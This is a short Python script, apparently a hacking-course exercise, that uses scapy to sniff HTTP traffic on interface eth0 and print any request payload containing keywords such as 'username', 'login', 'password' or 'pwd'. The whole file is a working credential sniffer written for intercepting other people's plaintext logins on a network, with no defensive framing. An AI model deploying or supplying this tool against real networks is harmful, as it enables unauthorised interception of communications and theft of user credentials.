#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface, store=False, prn=process_sniffed_packet)

def process_sniffed_packet(packet):
    # print(packet)
    if packet.haslayer(http.HTTPRequest):
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            keywords = ["username", "user", "login", "password", "pass", "pwd"]
            for keyword in keywords:
                if keyword in str(load):
                    print(load)
                    break
            # if "login" in str(load):
            #     print(load)

sniff("eth0")